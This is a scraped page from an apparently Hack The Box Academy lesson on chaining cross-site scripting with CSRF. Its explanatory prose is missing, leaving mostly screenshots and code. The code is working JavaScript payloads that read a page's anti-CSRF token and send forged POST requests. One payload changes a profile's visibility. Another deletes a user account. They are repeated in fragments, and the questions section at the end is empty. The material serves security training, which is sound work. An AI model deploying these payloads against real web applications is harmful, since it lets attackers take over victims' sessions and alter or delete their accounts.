<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/153/section/1450
// Platform Version: V1
// Module ID: 153
// Module Name: Session Security
// Module Difficulty: Medium
// Section ID: 1450
// Section Title: XSS & CSRF Chaining
// Page Title: Session Security
// Page Number: 09
-->

# XSS & CSRF Chaining

**Module Name:** Session Security **Page Number:** 09

#### SESSION SECURITY

# XSS & CSRF Chaining

``` shell-session
[!bash!]$ burpsuite
```

![https://academy.hackthebox.com/storage/modules/153/45.png](https://academy.hackthebox.com/storage/modules/153/45.png)

![https://academy.hackthebox.com/storage/modules/153/56.png](https://academy.hackthebox.com/storage/modules/153/56.png)

``` javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

``` javascript
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
```

``` javascript
req.onload = handleResponse;
```

``` javascript
req.open('get','/app/change-visibility',true);
```

``` javascript
req.send();
```

``` javascript
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
```

``` javascript
var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
```

![https://academy.hackthebox.com/storage/modules/153/57.png](https://academy.hackthebox.com/storage/modules/153/57.png)

``` javascript
var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
```

``` javascript
changeReq.open('post', '/app/change-visibility', true);
```

``` javascript
changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
```

``` javascript
changeReq.send('csrf='+token+'&action=change');
```

![https://academy.hackthebox.com/storage/modules/153/56.png](https://academy.hackthebox.com/storage/modules/153/56.png)

![https://academy.hackthebox.com/storage/modules/153/44.png](https://academy.hackthebox.com/storage/modules/153/44.png)

![https://academy.hackthebox.com/storage/modules/153/58.png](https://academy.hackthebox.com/storage/modules/153/58.png)

![https://academy.hackthebox.com/storage/modules/153/46.png](https://academy.hackthebox.com/storage/modules/153/46.png)

![https://academy.hackthebox.com/storage/modules/153/59.png](https://academy.hackthebox.com/storage/modules/153/59.png)

``` javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/delete', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token);
};
</script>
```

# 

# 

#### Questions

####